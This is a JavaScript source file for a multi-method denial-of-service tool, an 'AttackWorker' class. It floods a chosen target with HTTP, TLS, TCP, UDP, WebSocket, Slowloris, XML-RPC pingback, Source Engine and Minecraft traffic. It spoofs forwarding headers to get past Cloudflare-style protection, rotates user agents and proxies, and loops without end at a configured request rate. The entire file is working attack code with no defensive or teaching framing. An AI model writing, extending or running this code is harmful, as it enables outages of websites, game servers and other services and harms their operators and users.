const WebSocket = require("ws");
const fetch = require("node-fetch");
const AbortController = require("abort-controller");
const crypto = require("crypto");
const dgram = require("dgram");
const net = require("net");
const https = require("https");

class AttackWorker {
  constructor() {
    this.stats = {
      requestsSent: 0,
      bytesSent: 0,
    };

    this.methods = {
      HTTP_FLOOD: () => this.httpFlood(),
      TLS_FLOOD: () => this.tlsFlood(),
      SOCKET_FLOOD: () => this.socketFlood(),
      TCP_FLOOD: () => this.tcpFlood(),
      UDP_FLOOD: () => this.udpFlood(),
      SYN_FLOOD: () => this.synFlood(),
      BYPASS: () => this.bypass(),
      CFB: () => this.cfbFlood(),
      POST: () => this.postFlood(),
      SLOWLORIS: () => this.slowloris(),
      MINECRAFT: () => this.minecraftFlood(),
      GET: () => this.getFlood(),
      HEAD: () => this.headFlood(),
      NULL: () => this.nullFlood(),
      STRESS: () => this.stressFlood(),
      COOKIE: () => this.cookieFlood(),
      VSE: () => this.vseFlood(),
      MCBOT: () => this.mcbotFlood(),
      DYN: () => this.dynFlood(),
      PPS: () => this.ppsFlood(),
      EVEN: () => this.evenFlood(),
      XMLRPC: () => this.xmlrpcFlood(),
      OVH: () => this.ovhFlood(),
      SLOW: () => this.slowAttack(),
    };
  }

  async init(data) {
    this.target = data.target;
    this.method = data.method;
    this.rpc = data.rpc;
    this.proxy = data.proxy;
    this.userAgents = data.userAgents;
    this.cookies = data.cookies;

    await this.startAttack();
  }

  async startAttack() {
    const attackMethod = this.methods[this.method];

    while (true) {
      try {
        await attackMethod();
        this.stats.requestsSent++;
      } catch (err) {
        console.error(err);
      }
      await new Promise((r) => setTimeout(r, 1000 / this.rpc));
    }
  }

  async ovhFlood() {
    try {
      const headers = this.generateHeaders();
      headers["X-Forwarded-For"] = this.generateRandomIP();
      headers["X-Forwarded-Host"] = this.target;

      const response = await fetch(this.target, {
        method: "GET",
        headers: headers,
      });
      this.stats.requestsSent++;
      return true;
    } catch {
      return false;
    }
  }

  async slowAttack() {
    const sockets = [];
    const maxSockets = 150;

    for (let i = 0; i < maxSockets; i++) {
      try {
        const socket = new net.Socket();
        socket.connect({
          host: this.target.host,
          port: this.target.port || 80,
        });

        socket.write(
          `GET / HTTP/1.1\r\n` +
            `Host: ${this.target.host}\r\n` +
            `User-Agent: ${this.generateHeaders()["User-Agent"]}\r\n`
        );

        const interval = setInterval(() => {
          socket.write(`X-a: ${Math.random()}\r\n`);
        }, 10000);

        socket.on("error", () => {
          clearInterval(interval);
          socket.destroy();
        });

        sockets.push(socket);
        this.stats.requestsSent++;
      } catch (err) {
        continue;
      }
    }
    return true;
  }

  async dynFlood() {
    try {
      const payload = crypto.randomBytes(Math.random() * 1024);
      const headers = this.generateHeaders();
      headers["Content-Length"] = payload.length;

      const response = await fetch(this.target, {
        method: Math.random() > 0.5 ? "GET" : "POST",
        body: payload,
        headers: headers,
      });
      this.stats.bytesSent += payload.length;
      return true;
    } catch {
      return false;
    }
  }

  async ppsFlood() {
    try {
      const promises = [];
      for (let i = 0; i < 100; i++) {
        promises.push(
          fetch(this.target, {
            method: "GET",
            headers: this.generateHeaders(),
          })
        );
      }
      await Promise.all(promises);
      this.stats.requestsSent += 100;
      return true;
    } catch {
      return false;
    }
  }

  async evenFlood() {
    try {
      const methods = ["GET", "POST", "HEAD"];
      const method = methods[Math.floor(Math.random() * methods.length)];
      const response = await fetch(this.target, {
        method: method,
        headers: this.generateHeaders(),
        body: method === "POST" ? crypto.randomBytes(1024) : undefined,
      });
      this.stats.requestsSent++;
      return true;
    } catch {
      return false;
    }
  }

  async xmlrpcFlood() {
    const xmlPayload = `
    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param><value><string>${this.target}</string></value></param>
        <param><value><string>${this.target}</string></value></param>
      </params>
    </methodCall>`;

    try {
      const response = await fetch(this.target, {
        method: "POST",
        body: xmlPayload,
        headers: {
          ...this.generateHeaders(),
          "Content-Type": "application/xml",
        },
      });
      this.stats.bytesSent += xmlPayload.length;
      return true;
    } catch {
      return false;
    }
  }

  async stressFlood() {
    const payload = crypto.randomBytes(16384);
    try {
      const response = await fetch(this.target, {
        method: "POST",
        body: payload,
        headers: {
          ...this.generateHeaders(),
          "Content-Type": "application/x-www-form-urlencoded",
        },
      });
      this.stats.bytesSent += payload.length;
      return true;
    } catch {
      return false;
    }
  }

  async cookieFlood() {
    try {
      const headers = this.generateHeaders();
      headers["Cookie"] = Array(50)
        .fill()
        .map(
          () =>
            `${crypto.randomBytes(8).toString("hex")}=${crypto
              .randomBytes(24)
              .toString("hex")}`
        )
        .join("; ");

      const response = await fetch(this.target, {
        method: "GET",
        headers: headers,
      });
      this.stats.bytesSent += response.size;
      return true;
    } catch {
      return false;
    }
  }

  async vseFlood() {
    const client = dgram.createSocket("udp4");
    const packet = Buffer.from("\xFF\xFF\xFF\xFF\x54Source Engine Query\x00");

    try {
      client.send(packet, 0, packet.length, this.target.port, this.target.host);
      this.stats.bytesSent += packet.length;
      return true;
    } catch {
      return false;
    } finally {
      client.close();
    }
  }

  async mcbotFlood() {
    const client = new net.Socket();
    try {
      client.connect(this.target.port, this.target.host);

      const username = crypto.randomBytes(8).toString("hex");
      const loginPacket = Buffer.concat([
        Buffer.from([0x00]),
        Buffer.from([username.length]),
        Buffer.from(username),
      ]);

      client.write(loginPacket);
      this.stats.bytesSent += loginPacket.length;
      return true;
    } catch {
      return false;
    } finally {
      client.destroy();
    }
  }

  async getFlood() {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);
    try {
      const response = await fetch(this.target, {
        method: "GET",
        headers: this.generateHeaders(),
        signal: controller.signal,
      });
      this.stats.bytesSent += response.size;
      return true;
    } catch {
      return false;
    } finally {
      clearTimeout(timeout);
    }
  }

  async headFlood() {
    try {
      const response = await fetch(this.target, {
        method: "HEAD",
        headers: this.generateHeaders(),
      });
      this.stats.requestsSent++;
      return true;
    } catch {
      return false;
    }
  }

  async nullFlood() {
    try {
      const headers = this.generateHeaders();
      headers["User-Agent"] = "";
      const response = await fetch(this.target, {
        method: "GET",
        headers: headers,
      });
      this.stats.bytesSent += response.size;
      return true;
    } catch {
      return false;
    }
  }

  async cfbFlood() {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);
    try {
      const response = await fetch(this.target, {
        method: "GET",
        headers: {
          ...this.generateHeaders(),
          "CF-Connecting-IP": this.generateRandomIP(),
        },
        signal: controller.signal,
        ...(this.proxy && { proxy: this.proxy }),
      });
      const data = await response.arrayBuffer();
      this.stats.bytesSent += data.byteLength;
      return true;
    } catch {
      return false;
    } finally {
      clearTimeout(timeout);
    }
  }

  async httpFlood() {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    try {
      const response = await fetch(this.target, {
        method: "GET",
        headers: this.generateHeaders(),
        signal: controller.signal,
        ...(this.proxy && { proxy: this.proxy }),
      });

      const data = await response.arrayBuffer();
      this.stats.bytesSent += data.byteLength;
      return true;
    } catch {
      return false;
    } finally {
      clearTimeout(timeout);
    }
  }

  async socketFlood() {
    const ws = new WebSocket(this.target);
    const payload = crypto.randomBytes(1024);

    return new Promise((resolve) => {
      ws.onopen = () => {
        ws.send(payload);
        this.stats.bytesSent += payload.length;
        ws.close();
        resolve(true);
      };
      ws.onerror = () => resolve(false);
    });
  }

  async tcpFlood() {
    const client = new net.Socket();
    const payload = crypto.randomBytes(1024);

    try {
      await new Promise((resolve, reject) => {
        client.connect(this.target.port, this.target.host, () => {
          client.write(payload);
          this.stats.bytesSent += payload.length;
          resolve();
        });

        client.on("error", reject);
      });
      return true;
    } catch {
      return false;
    } finally {
      client.destroy();
    }
  }

  async udpFlood() {
    const client = dgram.createSocket("udp4");
    const payload = crypto.randomBytes(1024);

    try {
      const targetPort = parseInt(this.target.port);
      if (isNaN(targetPort) || targetPort <= 0 || targetPort >= 65536) {
        throw new Error("Invalid port number");
      }

      await new Promise((resolve, reject) => {
        client.send(
          payload,
          0,
          payload.length,
          targetPort,
          this.target.host,
          (err) => {
            if (err) reject(err);
            else resolve();
          }
        );
      });

      this.stats.bytesSent += payload.length;
      return true;
    } catch (err) {
      console.error(`UDP Flood error: ${err.message}`);
      return false;
    } finally {
      client.close();
    }
  }

  async synFlood() {
    try {
      const socket = new net.Socket();
      const options = {
        host: this.target.host,
        port: parseInt(this.target.port),
        timeout: 1000,
      };

      await new Promise((resolve, reject) => {
        socket.connect(options, () => {
          this.stats.requestsSent++;
          socket.destroy();
          resolve();
        });

        socket.on("error", (err) => {
          socket.destroy();
          reject(err);
        });

        socket.on("timeout", () => {
          socket.destroy();
          resolve();
        });
      });

      return true;
    } catch (err) {
      return false;
    }
  }

  async tlsFlood() {
    const payload = crypto.randomBytes(1024);

    try {
      await new Promise((resolve, reject) => {
        const req = https.request(
          this.target,
          {
            method: "GET",
            headers: this.generateHeaders(),
            rejectUnauthorized: false,
          },
          (res) => {
            this.stats.bytesSent += payload.length;
            resolve();
          }
        );

        req.on("error", reject);
        req.write(payload);
        req.end();
      });
    } catch (err) {
      console.error(err);
    }
  }

  async bypass() {
    try {
      const response = await fetch(this.target, {
        method: "GET",
        headers: this.generateHeaders(),
        agent: this.proxy,
      });

      this.stats.requestsSent++;
      this.stats.bytesSent += response.size;
    } catch (err) {
      console.error(err);
    }
  }

  async postFlood() {
    const payload = crypto.randomBytes(1024);
    try {
      const response = await fetch(this.target, {
        method: "POST",
        body: payload,
        headers: this.generateHeaders(),
        ...(this.proxy && { proxy: this.proxy }),
      });
      this.stats.bytesSent += payload.length;
      return true;
    } catch {
      return false;
    }
  }
  async slowloris() {
    const sockets = [];
    const maxSockets = 150;

    for (let i = 0; i < maxSockets; i++) {
      try {
        const socket = new net.Socket();
        socket.connect(this.target.port, this.target.host);
        socket.write(`GET / HTTP/1.1\r\nHost: ${this.target.host}\r\n`);

        const interval = setInterval(() => {
          socket.write(`X-a: ${crypto.randomBytes(1)}\r\n`);
        }, 15000);

        socket.on("error", () => {
          clearInterval(interval);
          socket.destroy();
        });

        sockets.push(socket);
      } catch (err) {
        console.error(err);
      }
    }
  }

  async minecraftFlood() {
    const client = new net.Socket();
    try {
      client.connect(this.target.port, this.target.host);

      const handshake = Buffer.from([
        0x00,
        0x00,
        this.target.host.length,
        ...Buffer.from(this.target.host),
        0x63,
        0xdd,
        0x01,
      ]);

      client.write(handshake);
      this.stats.bytesSent += handshake.length;

      client.destroy();
      return true;
    } catch {
      return false;
    }
  }

  generateRandomIP() {
    return Array(4)
      .fill(0)
      .map(() => Math.floor(Math.random() * 256))
      .join(".");
  }

  async setupProxy(proxyString) {
    const [host, port] = proxyString.split(":");
    return {
      host,
      port: parseInt(port),
      type: this.proxy.type || "http",
    };
  }

  generateHeaders() {
    return {
      "User-Agent":
        this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate",
      Connection: "keep-alive",
      "Cache-Control": "no-cache",
      Pragma: "no-cache",
    };
  }
}

module.exports = AttackWorker;
